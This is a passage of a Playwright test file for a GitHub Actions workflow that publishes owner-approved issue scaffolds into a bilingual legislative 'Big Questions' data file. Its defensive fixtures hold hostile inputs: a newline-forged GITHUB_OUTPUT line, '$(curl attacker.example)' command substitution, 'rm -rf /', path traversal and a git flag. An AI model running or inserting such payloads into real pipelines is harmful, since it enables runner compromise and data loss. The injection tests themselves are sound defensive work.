import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { expect, test } from '@playwright/test';
/*
 * THE PROPERTY THIS FILE EXISTS FOR:
 *
 *   What publishes is the copy the owner read. Byte for byte, field for
 *   field, with nothing trimmed, normalised, re-flowed or "fixed" between the
 *   issue he approved and data/moments.json.
 *
 * That is the whole warrant for automating the approve step at all.
 * `moments.howMadeBody` promises every reader an automated check first and a
 * person's judgement after it, before anything goes live. A workflow that
 * edits copy on the way past would leave that sentence describing a DRAFT
 * rather than the entry — the person would have reviewed something, but not
 * the thing on the page. So the rule is mechanical rather than aspirational,
 * and it is pinned here in three places: the parser that reads the issue, the
 * comparator that proves nothing changed, and the round trip through JSON
 * serialisation that the real write actually performs.
 *
 * The second half of the file pins the DECISIONS around that copy — slots,
 * the replace directive, and whether the record still says what the draft was
 * written from — because each of them is a refusal, and a refusal that
 * silently became a fix would be the same failure wearing a different hat.
 *
 * ZERO network, ZERO repo writes. Every function under test is pure; the
 * corpora are files already in the repo; the workflow is read as text, the
 * same posture tests/moment-watch-seen.unit.spec.ts takes over
 * moment-watch.yml (the wiring is YAML, and a static assertion is the honest
 * form of that guarantee here).
 */
import { ID_RE, checkMoments, vehicleKind } from '../lib/moments-gate.mjs';
import { nominationSlug, type Nomination } from '../lib/core/nominations';
import { buildReport } from '../scripts/moment-candidates.mjs';
import { draftFor, groundFor } from '../scripts/moment-draft.mjs';
import { PLACEHOLDER_ID, structureFor } from '../scripts/moment-scaffold.mjs';
import { APPROVE_INSTRUCTIONS, articlesFor, renderPush, scaffoldFor } from '../scripts/moment-watch.mjs';
import {
  LIVE_CAP,
  applyEntry,
  authorized,
  copyDiff,
  decide,
  liveMoments,
  parseReplaceDirectives,
  parseScaffold,
  prTitle,
  recordDrift,
  refusalComment,
  renderOutputs,
  replaceDirective,
  sameCopy,
  sanitizeForLog,
  slotDecision,
} from '../scripts/moment-approve.mjs';

const read = (p: string) => JSON.parse(readFileSync(join(__dirname, '..', p), 'utf8'));

interface BillRow {
  full_identifier: string;
  status: string;
  last_action_date?: string | null;
  last_action_text?: string | null;
  issue_tags?: string[];
}
interface MomentRow {
  name?: { en: string; es: string };
  status?: string;
  review_by?: string;
  vehicles?: { slug: string }[];
}

const bills = read('data/bills.json') as BillRow[];
const coverage = read('data/coverage.json') as Record<string, { url: string; source: string }[]>;
const momentsFile = read('data/moments.json') as Record<string, MomentRow>;
const nominations = read('data/nominations.json') as Nomination[];

const DAY_MS = 86_400_000;
const OWNER = 'cm2489';

const billBySlug = new Map(bills.map((b) => [b.full_identifier, b]));
const report = buildReport({ bills, coverage, moments: momentsFile, rejections: [], now: Date.now() });

/* ------------------------------------------------------------------ *
 * A real candidate, drafted with a stub, rendered into a real issue
 * body — the same wiring tests/moment-scaffold.unit.spec.ts uses, so
 * what this file parses is what moment-watch.yml actually files.
 * ------------------------------------------------------------------ */

const DRAFTED = {
  name: { en: 'Syria sanctions repeal', es: 'Derogación de sanciones a Siria' },
  summary: {
    en: 'A measure before the Senate would change two laws now in force. A yes vote adopts the change; a no vote leaves both laws as they are.',
    es: 'Una medida ante el Senado cambiaría dos leyes vigentes. Un voto a favor adopta el cambio; un voto en contra deja ambas leyes como están.',
  },
  role: {
    en: 'A yes vote adopts the change this measure names. A no vote leaves current law in place.',
    es: 'Un voto a favor adopta el cambio que nombra esta medida. Un voto en contra deja la ley actual como está.',
  },
};
const draftClient = {
  messages: { create: async () => ({ content: [{ type: 'text', text: JSON.stringify(DRAFTED) }] }) },
};

type Candidate = (typeof report.candidates)[number];

/**
 * A candidate whose mechanical half is fully derivable AND whose vehicle is
 * still live — the new-vehicle terminality rule (owner ruling 2026-08-09)
 * fails an added vehicle that is already over, so a `signed` bill would make
 * every gate assertion below fail for a reason that has nothing to do with
 * this file.
 *
 * `takenIds` is the real file's ids, so the derived id cannot collide with a
 * question that already exists — which is itself one of the refusals under
 * test further down, and must not fire by accident here.
 */
const takenIds = new Set(Object.keys(momentsFile));
const structureOf = (c: Candidate, nameEn: string, now: number) =>
  structureFor(c, billBySlug.get(c.slug), { now, articles: articlesFor(coverage, c.slug), takenIds, nameEn });

const TERMINAL = new Set(['signed', 'vetoed']);
const subject = report.candidates.find(
  (c) =>
    structureOf(c, DRAFTED.name.en, Date.now()).gaps.length === 0 &&
    !TERMINAL.has(billBySlug.get(c.slug)?.status ?? '') &&
    Boolean(billBySlug.get(c.slug)?.last_action_date),
);

/**
 * The clock is pinned three days after the subject's own last action, not to
 * "now". Two of this file's checks are date arithmetic against the record —
 * the 45-day signal window and the `review_by` tripwire — and a corpus that
 * ages one day every day would otherwise decide, silently and eventually,
 * whether the happy path is still testable.
 */
const NOW = subject?.lastActionDate
  ? Date.parse(`${subject.lastActionDate}T00:00:00Z`) + 3 * DAY_MS
  : Date.now();

async function realScaffold() {
  expect(
    subject,
    'no candidate in the corpus has a fully derivable structure AND a live vehicle. That is far more likely to mean structureFor broke than that the corpus went quiet.',
  ).toBeTruthy();
  const c = subject as Candidate;
  const draft = await draftFor(draftClient, groundFor(c, billBySlug.get(c.slug), null));
  expect(draft.drafted, 'the stub reply should have cleared the draft lint').toBe(true);
  const structure = structureOf(c, draft.name.en, NOW);
  return { c, scaffold: scaffoldFor(c, draft, structure), id: structure.id };
}

/** The issue body moment-watch.yml would file for that candidate. */
async function realIssueBody() {
  const { c, scaffold, id } = await realScaffold();
  const draft = await draftFor(draftClient, groundFor(c, billBySlug.get(c.slug), null));
  const body = renderPush([c], report, {
    grounds: new Map([[c.slug, groundFor(c, billBySlug.get(c.slug), null)]]),
    drafts: new Map([[c.slug, draft]]),
    structures: new Map([[c.slug, structureOf(c, draft.name.en, NOW)]]),
    rejections: [],
  });
  return { body, scaffold, id };
}

/* ================================================================== *
 * 1 · THE PARSER — what comes out of the issue is what went in
 * ================================================================== */

test.describe('the issue-body parser', () => {
  test('a real candidate issue round-trips to the exact entry the scaffold emitted', async () => {
    const { body, scaffold, id } = await realIssueBody();
    const parsed = parseScaffold(body);
    expect(parsed.ok, parsed.ok ? '' : parsed.error).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.id).toBe(id);
    // Not toEqual: the point is that the KEY ORDER survives too, because key
    // order is what the committed file's diff looks like.
    expect(copyDiff(scaffold[id], parsed.entry)).toEqual([]);
  });

  test('an issue with no scaffold refuses instead of guessing', () => {
    const parsed = parseScaffold('## 1 new Big Question candidate\n\nSome prose and no fence.');
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.error).toContain('no ```json scaffold block');
  });

  test('two scaffolds refuse — choosing between them is an editorial act, not a parse', () => {
    const body = ['```json', '{"a":{}}', '```', 'and', '```json', '{"b":{}}', '```'].join('\n');
    const parsed = parseScaffold(body);
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.error).toContain('2 scaffold blocks');
  });

  test('malformed JSON refuses and says so, rather than throwing', () => {
    const parsed = parseScaffold('```json\n{"a": }\n```');
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.error).toContain('not valid JSON');
  });

  test('two moment ids in one block refuse — the second would silently replace the first', () => {
    const parsed = parseScaffold('```json\n{"one":{},"two":{}}\n```');
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.error).toContain('2 top-level keys');
  });

  test('the un-edited placeholder id refuses — it would become a permanent URL', () => {
    const parsed = parseScaffold(`\`\`\`json\n{"${PLACEHOLDER_ID}":{"name":{"en":"x","es":"x"}}}\n\`\`\``);
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.error).toContain(PLACEHOLDER_ID);
  });

  /*
   * THE ID IS UNTRUSTED INPUT — the reproduction, kept as a fixture.
   *
   * Until 2026-08-12 parseScaffold accepted ANY string as the moment id. The
   * gate would have rejected it eventually, but only after the id had already
   * become a $GITHUB_OUTPUT value, an env: value, a branch name and a commit
   * subject. The first fixture below is the real one: a key carrying a newline
   * forges a second GITHUB_OUTPUT line, and `reason=` was read straight into a
   * `run:` body on a runner with contents: write against an unprotected main.
   */
  const HOSTILE_IDS: [string, string][] = [
    ['a newline forging a second GITHUB_OUTPUT key', 'evil\nreason=$(id)'],
    ['a carriage return doing the same', 'evil\rmoment_id=other'],
    ['command substitution', 'evil$(curl attacker.example)'],
    ['a shell metacharacter', 'evil; rm -rf /'],
    ['a path traversal in what becomes a branch name', '../../../etc/passwd'],
    ['a leading dash, which git reads as a flag', '--force'],
    ['uppercase, which the gate rejects but only at the end', 'Evil-Id'],
    ['a double hyphen', 'a--b'],
    ['a trailing hyphen', 'trailing-'],
    ['whitespace', 'two words'],
  ];

  for (const [label, id] of HOSTILE_IDS) {
    test(`parseScaffold refuses an id with ${label}`, () => {
      const parsed = parseScaffold(`\`\`\`json\n${JSON.stringify({ [id]: { name: { en: 'x', es: 'x' } } })}\n\`\`\``);
      expect(parsed.ok, `"${id.replace(/[\r\n]/g, '\\n')}" must not parse`).toBe(false);
      if (!parsed.ok) {
        expect(parsed.error).toContain('lowercase kebab slug');
        // The refusal must not echo the hostile key back into a log line.
        expect(parsed.error).not.toContain(id);
      }
    });
  }

  test('the id regex it enforces IS the gate\'s, not a second copy', () => {
    // §2.3: a second definition is a definition that can disagree, and the day
    // they do the loose one wins. Same object, imported from the gate.
    expect(ID_RE.source).toBe(/^[a-z0-9]+(-[a-z0-9]+)*$/.source);
    const good = parseScaffold('```json\n{"syria-sanctions-repeal":{"name":{"en":"x","es":"x"}}}\n```');
    expect(good.ok).toBe(true);
  });
});

/* ================================================================== *
 * 1b · $GITHUB_OUTPUT and the log — two line-oriented channels
 * ================================================================== */

test.describe('the GITHUB_OUTPUT writer', () => {
  test('writes one key=value line per pair', () => {
    expect(renderOutputs([['decision', 'approve'], ['moment_id', 'syria-sanctions-repeal']])).toBe(
      'decision=approve\nmoment_id=syria-sanctions-repeal\n',
    );
  });

  test('an empty value is fine — it is how "no retirement" is expressed', () => {
    expect(renderOutputs([['retire', '']])).toBe('retire=\n');
  });

  test('THE INJECTION: a value containing a newline is refused, not escaped', () => {
    // Forging a line here means declaring an output this script never set, and
    // the workflow consumes those. There is no legitimate multi-line value in
    // this script, so refusing is strictly better than encoding.
    expect(() => renderOutputs([['moment_id', 'evil\nreason=$(id)']])).toThrow(/newline or NUL/);
    expect(() => renderOutputs([['reason', 'a\rb']])).toThrow(/newline or NUL/);
    expect(() => renderOutputs([['reason', 'a\0b']])).toThrow(/newline or NUL/);
  });

  test('the refusal does not repeat the hostile value into the log', () => {
    try {
      renderOutputs([['moment_id', 'evil\nreason=$(curl attacker.example)']]);
      throw new Error('should have thrown');
    } catch (e) {
      expect((e as Error).message).not.toContain('attacker.example');
      expect((e as Error).message).toContain('not repeated here');
    }
  });

  test('a key that is not a plain identifier is refused too', () => {
    expect(() => renderOutputs([['not a key', 'x']])).toThrow(/plain identifier/);
    expect(() => renderOutputs([['UPPER', 'x']])).toThrow(/plain identifier/);
  });
});

test.describe('the log guard', () => {
  test('a workflow command in issue-derived text is neutralised', () => {
    // A run: step's stderr is scanned by the runner for ::command:: lines, and
    // several refusal messages quote the issue back.
    const out = sanitizeForLog('::add-mask::secret\n  ::error::spoofed');
    expect(out).not.toMatch(/^\s*::/m);
    expect(out).toContain('add-mask');
  });

  test('ordinary prose is untouched', () => {
    const prose = 'the id `a-b` is not live (status: retired) — see docs';
    expect(sanitizeForLog(prose)).toBe(prose);
  });
});

/* ================================================================== *
 * 2 · BYTE FIDELITY — the comparator, and the round trip the real
 *     write performs
 * ================================================================== */

const ENTRY = {
  name: { en: 'A question', es: 'Una pregunta' },
  summary: { en: 'What the record says. ', es: 'Lo que dice el expediente. ' },
  aliases: { en: ['S. 1'], es: ['S. 1'] },
  category: 'health',
  vehicles: [{ slug: 's-1-119', role: { en: 'Yes does X.', es: 'Sí hace X.' }, _record: 'https://example.com' }],
  qualifying_signal: { type: 'tier0_floor', refs: ['https://www.congress.gov/x'] },
  opened: '2026-08-01',
  review_by: '2026-08-31',
  status: 'live',
};

test.describe('the byte-fidelity comparator', () => {
  test('identical entries differ nowhere', () => {
    expect(copyDiff(ENTRY, structuredClone(ENTRY))).toEqual([]);
    expect(sameCopy(ENTRY, structuredClone(ENTRY))).toBe(true);
  });

  test('a trimmed string is a difference — the trailing space in the fixture is deliberate', () => {
    const edited = structuredClone(ENTRY);
    edited.summary.en = edited.summary.en.trim();
    const diff = copyDiff(ENTRY, edited);
    expect(diff).toHaveLength(1);
    expect(diff[0]).toContain('summary.en');
  });

  test('re-ordered keys are a difference, because a re-ordered object is a rewritten file', () => {
    const reordered = { ...ENTRY, name: { es: ENTRY.name.es, en: ENTRY.name.en } };
    expect(sameCopy(ENTRY, reordered)).toBe(false);
    expect(copyDiff(ENTRY, reordered)[0]).toContain('name: keys');
  });

  test('a dropped provenance key is a difference — nothing is cleaned up on the way past', () => {
    const stripped = structuredClone(ENTRY);
    delete (stripped.vehicles[0] as Record<string, unknown>)._record;
    expect(copyDiff(ENTRY, stripped)[0]).toContain('vehicles[0]: keys');
  });

  test('an added field is a difference', () => {
    const extra = { ...ENTRY, context_refs: [{ kind: 'crs', url: 'https://crsreports.congress.gov/x' }] };
    expect(sameCopy(ENTRY, extra)).toBe(false);
  });

  test('a changed vehicle role is caught at its own path, not as a blanket mismatch', () => {
    const edited = structuredClone(ENTRY);
    edited.vehicles[0].role.es = 'Otra cosa.';
    expect(copyDiff(ENTRY, edited)).toEqual([
      expect.stringContaining('vehicles[0].role.es'),
    ]);
  });

  test('THE REAL ROUND TRIP: parse the issue, splice, serialise, re-read — zero drift', async () => {
    const { body } = await realIssueBody();
    const parsed = parseScaffold(body);
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    // Exactly what scripts/moment-approve.mjs --write does: applyEntry, then
    // JSON.stringify(…, null, 2) to disk, then JSON.parse of what it reads
    // back. Anything lost in serialisation shows up here.
    const next = applyEntry(momentsFile, parsed.id, parsed.entry, null);
    const reread = JSON.parse(JSON.stringify(next, null, 2));
    expect(copyDiff(parsed.entry, reread[parsed.id])).toEqual([]);
  });

  test('and every entry ALREADY in data/moments.json survives the same round trip', () => {
    const reread = JSON.parse(JSON.stringify(momentsFile, null, 2));
    for (const id of Object.keys(momentsFile)) {
      expect(copyDiff(momentsFile[id], reread[id]), id).toEqual([]);
    }
  });
});

/* ================================================================== *
 * 3 · SLOTS — the cap, and who decides what retires
 * ================================================================== */

/** N live moments plus one retired, so the fixtures exercise both statuses. */
const momentsWith = (liveIds: string[], extra: Record<string, MomentRow> = {}) => {
  const out: Record<string, MomentRow> = {};
  for (const id of liveIds) out[id] = { name: { en: id, es: id }, status: 'live', review_by: '2026-12-01' };
  return { ...out, ...extra };
};
const SIX = ['a', 'b', 'c', 'd', 'e', 'f'];

test.describe('slot logic', () => {
  test('the cap this file reasons about is the cap the gate enforces', () => {
    // lib/moments-gate.mjs states the number inside a violation string rather
    // than as a constant, so it is asserted here rather than imported: a
    // seventh live moment must fail the real gate at exactly LIVE_CAP + 1.
    const { violations } = checkMoments(
      momentsWith([...SIX, 'g']),
      { bill: new Set(), nomination: new Set() },
      () => undefined,
    );
    expect(violations.some((v) => v.includes(`${LIVE_CAP + 1} live moments`))).toBe(true);
  });

  test('with room, the entry is appended and nothing retires', () => {
    const d = slotDecision({ moments: momentsWith(['a', 'b']), newId: 'new' });
    expect(d).toMatchObject({ ok: true, action: 'append', retire: null });
  });

  test('with six live and no directive, it refuses and names all six', () => {
    const d = slotDecision({ moments: momentsWith(SIX), newId: 'new' });
    expect(d.ok).toBe(false);
    if (d.ok) return;
    expect(d.need).toBe('directive');
    for (const id of SIX) expect(d.error).toContain(`\`${id}\``);
    expect(d.error).toContain('/replace <moment-id>');
  });

  test('with six live and a valid directive, the named question retires', () => {
    const d = slotDecision({ moments: momentsWith(SIX), replaceId: 'c', newId: 'new' });
    expect(d).toMatchObject({ ok: true, action: 'replace', retire: 'c' });
  });

  test('a directive naming an already-retired question refuses — retiring it frees no slot', () => {
    const moments = momentsWith(SIX, { old: { name: { en: 'old', es: 'old' }, status: 'retired' } });
    const d = slotDecision({ moments, replaceId: 'old', newId: 'new' });
    expect(d.ok).toBe(false);
    if (!d.ok) expect(d.error).toContain('not live');
  });

  test('a directive naming nothing in the file refuses, and lists what is there', () => {
    const d = slotDecision({ moments: momentsWith(SIX), replaceId: 'typo', newId: 'new' });
    expect(d.ok).toBe(false);
    if (!d.ok) expect(d.error).toContain('names no question');
  });

  test('an id that already exists refuses even with room — one key, two entries, one survivor', () => {
    const d = slotDecision({ moments: momentsWith(['a']), newId: 'a' });
    expect(d.ok).toBe(false);
    if (!d.ok) expect(d.error).toContain('already a key');
  });

  test('the id-collision refusal has its OWN heading, not the replace directive\'s', () => {
    // It used to return need:'valid-directive', so an issue carrying NO
    // directive was told "the replace directive does not resolve" — a heading
    // about a comment the owner never wrote.
    const d = slotDecision({ moments: momentsWith(['a']), newId: 'a' });
    expect(d.ok).toBe(false);
    if (d.ok) return;
    expect(d.need).toBe('id-collision');
    const comment = refusalComment({ reason: d.need, error: d.error }, { issue: 1 });
    expect(comment).toContain('that moment id is already taken');
    expect(comment).not.toContain('replace directive does not resolve');
  });

  /*
   * S4 — THE ORDERING BUG, kept as a fixture because the symptom is silent.
   *
   * A `/replace` comment is durable: it sits in the thread forever and the
   * label can be re-applied days later. Consulting it before checking for room
   * meant a directive written for a six-full attempt still fired on a LATER
   * approval that needed no slot — retiring a live Big Question to make room
   * that already existed, with nothing in the PR saying so.
   */
  test('a leftover directive does NOT retire anything when there is room', () => {
    const d = slotDecision({ moments: momentsWith(['a', 'b']), replaceId: 'a', newId: 'new' });
    expect(d).toMatchObject({ ok: true, action: 'append', retire: null });
  });

  test('…and the ignored directive is reported rather than swallowed', () => {
    const d = slotDecision({ moments: momentsWith(['a', 'b']), replaceId: 'a', newId: 'new' });
    if (!d.ok) throw new Error('expected room');
    expect(d.ignoredDirective).toBe('a');
  });

  test('an ignored directive that names nothing real is still only ignored, never an error', () => {
    // At five live the directive is irrelevant, valid or not — validating it
    // would refuse an approval that needs no slot at all.
    const d = slotDecision({ moments: momentsWith(['a']), replaceId: 'nonexistent', newId: 'new' });
    expect(d).toMatchObject({ ok: true, action: 'append', retire: null, ignoredDirective: 'nonexistent' });
  });

  test('with no directive and room, ignoredDirective is null rather than undefined', () => {
    const d = slotDecision({ moments: momentsWith(['a']), newId: 'new' });
    if (!d.ok) throw new Error('expected room');
    expect(d.ignoredDirective).toBeNull();
  });

  test('at the cap the directive is obeyed — it is only ever read there', () => {
    const d = slotDecision({ moments: momentsWith(SIX), replaceId: 'c', newId: 'new' });
    expect(d).toMatchObject({ ok: true, action: 'replace', retire: 'c', ignoredDirective: null });
  });

  test('a retired id still collides — the entry persists as the record that it existed', () => {
    const moments = momentsWith(['a'], { gone: { name: { en: 'g', es: 'g' }, status: 'retired' } });
    const d = slotDecision({ moments, newId: 'gone' });
    expect(d.ok).toBe(false);
  });

  test('liveMoments counts stored status only — the computed states are not slots', () => {
    const moments = momentsWith(['a', 'b'], { z: { name: { en: 'z', es: 'z' }, status: 'retired' } });
    expect(liveMoments(moments).map((m) => m.id)).toEqual(['a', 'b']);
  });
});

/* ================================================================== *
 * 4 · THE REPLACE DIRECTIVE
 * ================================================================== */

const comment = (login: string, body: string) => ({ author: { login }, body });

test.describe('the /replace directive', () => {
  test("the owner's directive is read", () => {
    const found = parseReplaceDirectives([comment(OWNER, '/replace shutdown')], { owner: OWNER });
    expect(found.map((d) => d.id)).toEqual(['shutdown']);
  });

  test('anybody else is ignored — a comment is not an authorization', () => {
    const found = parseReplaceDirectives(
      [comment('someone-else', '/replace shutdown'), comment('bot', '/replace iran-war-powers')],
      { owner: OWNER },
    );
    expect(found).toEqual([]);
  });

  test('a directive must be its own line — prose about replacing is prose', () => {
    const found = parseReplaceDirectives(
      [comment(OWNER, 'I wonder whether we should /replace shutdown with this one?')],
      { owner: OWNER },
    );
    expect(found).toEqual([]);
  });

  test('last wins, and the overridden ones are still reported', () => {
    const d = replaceDirective(
      [comment(OWNER, '/replace one'), comment(OWNER, 'on reflection\n/replace two')],
      { owner: OWNER },
    );
    expect(d?.id).toBe('two');
    expect(d?.all.map((x) => x.id)).toEqual(['one', 'two']);
  });

  test('no directive at all is null, not an empty-string id', () => {
    expect(replaceDirective([comment(OWNER, 'looks good')], { owner: OWNER })).toBeNull();
    expect(replaceDirective([], { owner: OWNER })).toBeNull();
    expect(replaceDirective(undefined as never, { owner: OWNER })).toBeNull();
  });
});

/* ================================================================== *
 * 5 · HAS THE RECORD MOVED?
 * ================================================================== */

const driftEntry = (over: Partial<typeof ENTRY> = {}) => ({
  ...structuredClone(ENTRY),
  vehicles: [
    {
      slug: 's-1-119',
      role: { en: 'x', es: 'x' },
      _status_at_scaffold: 'floor_vote',
      _last_action_at_scaffold: '2026-08-01',
    },
  ],
  ...over,
});
const driftRow = (over: Partial<BillRow> = {}) =>
  new Map([['s-1-119', { full_identifier: 's-1-119', status: 'floor_vote', last_action_date: '2026-08-01', ...over }]]);
const AT = Date.parse('2026-08-05T00:00:00Z');

test.describe('record drift', () => {
  test('an unchanged record blocks nothing', () => {
    const { blocking } = recordDrift(driftEntry(), { billBySlug: driftRow(), nominationBySlug: new Map(), now: AT });
    expect(blocking).toEqual([]);
  });

  test('a status that moved blocks — the approved sentences describe the earlier state', () => {
    const { blocking } = recordDrift(driftEntry(), {
      billBySlug: driftRow({ status: 'passed_chamber' }),
      nominationBySlug: new Map(),
      now: AT,
    });
    expect(blocking.join(' ')).toContain('was `floor_vote`');
    expect(blocking.join(' ')).toContain('`passed_chamber` now');
  });

  test('a new last action blocks', () => {
    const { blocking } = recordDrift(driftEntry(), {
      billBySlug: driftRow({ last_action_date: '2026-08-04' }),
      nominationBySlug: new Map(),
      now: AT,
    });
    expect(blocking.join(' ')).toContain('2026-08-04');
  });

  test('a signal older than the published 45-day window blocks, and says why', () => {
    const late = Date.parse('2026-10-01T00:00:00Z');
    const { blocking } = recordDrift(driftEntry(), {
      billBySlug: driftRow(),
      nominationBySlug: new Map(),
      now: late,
    });
    expect(blocking.join(' ')).toContain('45 days');
    expect(blocking.join(' ')).toContain('whyCriteria');
  });

  test('a review_by that already passed blocks — born stale is not a state to publish in', () => {
    const { blocking } = recordDrift(driftEntry({ review_by: '2026-08-02' }), {
      billBySlug: driftRow(),
      nominationBySlug: new Map(),
      now: AT,
    });
    expect(blocking.join(' ')).toContain('review_by');
    expect(blocking.join(' ')).toContain('stale');
  });

  test('a vehicle with no provenance keys is REPORTED, never silently passed', () => {
    const entry = driftEntry({ vehicles: [{ slug: 's-1-119', role: { en: 'x', es: 'x' } }] } as never);
    const { blocking, notes } = recordDrift(entry, {
      billBySlug: driftRow(),
      nominationBySlug: new Map(),
      now: AT,
    });
    expect(blocking).toEqual([]);
    expect(notes.join(' ')).toContain('_status_at_scaffold');
  });

  test('a vehicle that resolves in no corpus is left to the gate, which names the file', () => {
    const { blocking, notes } = recordDrift(driftEntry(), {
      billBySlug: new Map(),
      nominationBySlug: new Map(),
      now: AT,
    });
    // No date to age, so the window check fires; the point is that no
    // second, vaguer complaint about the missing slug is added on top.
    expect(blocking.join(' ')).not.toContain('_status_at_scaffold');
    expect(notes).toEqual([]);
  });
});

/* ================================================================== *
 * 6 · THE EDIT
 * ================================================================== */

test.describe('applyEntry', () => {
  test('appends at the end and touches nothing else', () => {
    const before = momentsWith(['a', 'b']);
    const after = applyEntry(before, 'new', ENTRY, null);
    expect(Object.keys(after)).toEqual(['a', 'b', 'new']);
    expect(copyDiff(before.a, after.a)).toEqual([]);
    expect(copyDiff(ENTRY, after.new)).toEqual([]);
  });

  test('retirement flips exactly one stored status and preserves key order', () => {
    const before = momentsWith(SIX);
    const after = applyEntry(before, 'new', ENTRY, 'c');
    expect(Object.keys(after)).toEqual([...SIX, 'new']);
    expect(after.c.status).toBe('retired');
    expect(Object.keys(after.c)).toEqual(Object.keys(before.c));
    for (const id of SIX.filter((x) => x !== 'c')) expect(after[id].status).toBe('live');
  });

  test('the input object is not mutated — a refusal after this point must leave the file readable', () => {
    const before = momentsWith(SIX);
    applyEntry(before, 'new', ENTRY, 'c');
    expect(before.c.status).toBe('live');
    expect(Object.keys(before)).toEqual(SIX);
  });
});

/* ================================================================== *
 * 7 · AUTHORIZATION
 * ================================================================== */

test.describe('authorization', () => {
  test('the owner, labelling his own repo, is authorized', () => {
    expect(authorized({ sender: OWNER, actor: OWNER, owner: OWNER })).toBe(true);
  });

  test('anyone else is not — in either position', () => {
    expect(authorized({ sender: 'stranger', actor: OWNER, owner: OWNER })).toBe(false);
    expect(authorized({ sender: OWNER, actor: 'stranger', owner: OWNER })).toBe(false);
    expect(authorized({ sender: 'stranger', actor: 'stranger', owner: OWNER })).toBe(false);
  });

  test('a missing identity is never a pass — an unset variable must not read as the owner', () => {
    expect(authorized({ sender: '', actor: '', owner: '' })).toBe(false);
    expect(authorized({ sender: undefined, actor: undefined, owner: OWNER })).toBe(false);
    expect(authorized({ sender: OWNER, actor: OWNER, owner: undefined })).toBe(false);
  });
});

/* ================================================================== *
 * 8 · END TO END, against the real corpora and the real gate
 * ================================================================== */

/**
 * The real file with room guaranteed. How many questions are live is a fact
 * about the corpus on the day the suite runs, and the property under test is
 * not the corpus — so the extras are flipped to `retired` (which is what a
 * `/replace` would have done anyway) until LIVE_CAP - 1 remain.
 */
function withRoom(): Record<string, MomentRow> {
  const out = structuredClone(momentsFile);
  const live = Object.keys(out).filter((id) => out[id].status === 'live');
  for (const id of live.slice(LIVE_CAP - 1)) out[id].status = 'retired';
  return out;
}

test.describe('decide(), end to end', () => {
  test('a real candidate issue publishes, gate-clean, with the entry unchanged', async () => {
    const { body, id } = await realIssueBody();
    const d = decide({
      body,
      comments: [],
      moments: withRoom(),
      bills,
      nominations,
      owner: OWNER,
      now: NOW,
    });
    expect(d.decision, d.decision === 'refuse' ? `${d.reason}: ${d.error}` : '').toBe('approve');
    if (d.decision !== 'approve') return;
    expect(d.id).toBe(id);
    expect(d.action).toBe('append');
    expect(d.retire).toBeNull();
    expect(d.gate.violations).toEqual([]);
    expect(copyDiff(d.entry, d.next[d.id])).toEqual([]);
  });

  test('the spliced file passes the REAL gate wired exactly as check-moments.mjs wires it', async () => {
    const { body } = await realIssueBody();
    const d = decide({ body, comments: [], moments: withRoom(), bills, nominations, owner: OWNER, now: NOW });
    if (d.decision !== 'approve') throw new Error(`expected approve, got ${d.reason}: ${d.error}`);

    const slugsByKind = {
      bill: new Set(bills.map((b) => b.full_identifier)),
      nomination: new Set(nominations.map(nominationSlug)),
    };
    const statusByKind: Record<string, Map<string, string>> = {
      bill: new Map(bills.map((b) => [b.full_identifier, b.status])),
      nomination: new Map(nominations.map((n) => [nominationSlug(n), n.status])),
    };
    const { violations } = checkMoments(
      d.next,
      slugsByKind,
      (v: { slug: string; kind?: string }) => statusByKind[vehicleKind(v)]?.get(v.slug),
      {
        describedNominationSlugs: new Set(
          nominations.filter((n) => n.nominee_description?.trim()).map(nominationSlug),
        ),
        now: NOW,
      },
    );
    expect(violations).toEqual([]);
  });

  test('six full and no directive: it refuses, and the file it would have written is never built', async () => {
    const { body } = await realIssueBody();
    const full = structuredClone(momentsFile);
    // Pad to the cap with entries that are live and nothing else — the slot
    // question is answered before any of them is validated.
    let i = 0;
    while (Object.values(full).filter((m) => m.status === 'live').length < LIVE_CAP) {
      full[`filler-${i++}`] = { name: { en: `f${i}`, es: `f${i}` }, status: 'live', review_by: '2026-12-01' };
    }
    const d = decide({ body, comments: [], moments: full, bills, nominations, owner: OWNER, now: NOW });
    expect(d.decision).toBe('refuse');
    if (d.decision !== 'refuse') return;
    expect(d.reason).toBe('directive');
    expect(d.error).toContain('/replace <moment-id>');
  });

  test('an entry whose prose was never written refuses on the GATE, with the gate\'s own words', async () => {
    const { scaffold, id } = await realScaffold();
    const blanked = structuredClone(scaffold);
    blanked[id].name = { en: '', es: '' };
    const body = ['```json', JSON.stringify(blanked, null, 2), '```'].join('\n');
    const d = decide({ body, comments: [], moments: withRoom(), bills, nominations, owner: OWNER, now: NOW });
    expect(d.decision).toBe('refuse');
    if (d.decision !== 'refuse') return;
    expect(d.reason).toBe('gate');
    expect(d.error).toContain('bilingual-parity hard rule');
  });

  test('advocacy vocabulary refuses on the gate rather than being edited out', async () => {
    const { scaffold, id } = await realScaffold();
    const dirty = structuredClone(scaffold);
    dirty[id].summary = { en: 'A vote to block the measure.', es: 'Un voto para bloquear la medida.' };
    const body = ['```json', JSON.stringify(dirty, null, 2), '```'].join('\n');
    const d = decide({ body, comments: [], moments: withRoom(), bills, nominations, owner: OWNER, now: NOW });
    expect(d.decision).toBe('refuse');
    if (d.decision !== 'refuse') return;
    expect(d.reason).toBe('gate');
    expect(d.error).toContain('forbidden vocabulary');
  });

  test('the PR title is a plain sentence, and names the retirement when there is one', async () => {
    const { body } = await realIssueBody();
    const room = withRoom();
    const d = decide({ body, comments: [], moments: room, bills, nominations, owner: OWNER, now: NOW });
    if (d.decision !== 'approve') throw new Error('expected approve');
    expect(prTitle(d, room)).toBe(`${DRAFTED.name.en} opens as a Big Question`);
    expect(prTitle({ ...d, retire: 'iran-war-powers' }, momentsFile)).toContain('retires');
  });
});

/* ================================================================== *
 * 9 · THE WIRING — YAML, pinned as text
 * ================================================================== */

const workflow = (name: string) =>
  readFileSync(join(__dirname, '..', '.github/workflows', name), 'utf8');

/** Comment lines removed. Not a convenience: these workflows explain their own
 *  decisions in comments that necessarily quote the shape being rejected, and
 *  an assertion that fires on its own rationale is a rule nobody can document. */
const withoutComments = (text: string) =>
  text
    .split('\n')
    .filter((l) => !/^\s*#/.test(l))
    .join('\n');

/**
